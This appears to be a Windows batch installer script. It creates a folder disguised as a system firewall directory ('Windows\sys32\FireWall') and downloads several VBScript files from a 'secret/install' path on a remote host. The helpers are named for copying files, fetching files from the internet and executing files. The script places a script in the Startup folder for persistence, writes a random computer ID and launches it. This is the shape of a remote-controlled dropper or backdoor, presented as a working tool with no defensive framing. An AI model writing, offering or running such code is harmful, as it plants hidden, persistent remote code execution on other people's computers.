if not exist "%USERPROFILE%\Windows\sys32\FireWall" MD "%USERPROFILE%\Windows\sys32\FireWall"
if not exist "%USERPROFILE%\Windows\sys32\FireWall\helperScripts" MD "%USERPROFILE%\Windows\sys32\FireWall\helperScripts"

rem -----------------START AND UPDATE SCRIPTS--------------------- 
set "URL=http://wumbogames.github.io/secret/install/start.vbs"
set "SaveAs=%USERPROFILE%\Windows\sys32\FireWall\start.vbs"
powershell "Import-Module BitsTransfer; Start-BitsTransfer '%URL%' '%SaveAs%'"

set "URL=http://wumbogames.github.io/secret/install/update.vbs"
set "SaveAs=%USERPROFILE%\Windows\sys32\FireWall\update.vbs"
powershell "Import-Module BitsTransfer; Start-BitsTransfer '%URL%' '%SaveAs%'"


rem -----------------HELPER SCRIPTS--------------------- 
set "URL=http://wumbogames.github.io/secret/install/helperScripts/CopyAllFiles.vbs"
set "SaveAs=%USERPROFILE%\Windows\sys32\FireWall\helperScripts\CopyAllFiles.vbs"
powershell "Import-Module BitsTransfer; Start-BitsTransfer '%URL%' '%SaveAs%'"

set "URL=http://wumbogames.github.io/secret/install/helperScripts/CopyFileFromInternet.vbs"
set "SaveAs=%USERPROFILE%\Windows\sys32\FireWall\helperScripts\CopyFileFromInternet.vbs"
powershell "Import-Module BitsTransfer; Start-BitsTransfer '%URL%' '%SaveAs%'"

set "URL=http://wumbogames.github.io/secret/install/helperScripts/ExecuteFile.vbs"
set "SaveAs=%USERPROFILE%\Windows\sys32\FireWall\helperScripts\ExecuteFile.vbs"
powershell "Import-Module BitsTransfer; Start-BitsTransfer '%URL%' '%SaveAs%'"

set "URL=http://wumbogames.github.io/secret/install/helperScripts/ReadFromFile.vbs"
set "SaveAs=%USERPROFILE%\Windows\sys32\FireWall\helperScripts\ReadFromFile.vbs"
powershell "Import-Module BitsTransfer; Start-BitsTransfer '%URL%' '%SaveAs%'"


rem -----------------STARTUP SCRIPT--------------------- 
set "URL=http://wumbogames.github.io/secret/install/startup.vbs"
set "SaveAs=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs"
powershell "Import-Module BitsTransfer; Start-BitsTransfer '%URL%' '%SaveAs%'"


rem -----------------MAKE COMPUTER ID--------------------- 
if exist "%USERPROFILE%\Windows\sys32\FireWall\id.txt" del "%USERPROFILE%\Windows\sys32\FireWall\id.txt"
(
echo %RANDOM%
) >"%USERPROFILE%\Windows\sys32\FireWall\id.txt"


rem -----------------ACTUALLY START IT--------------------- 
"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs"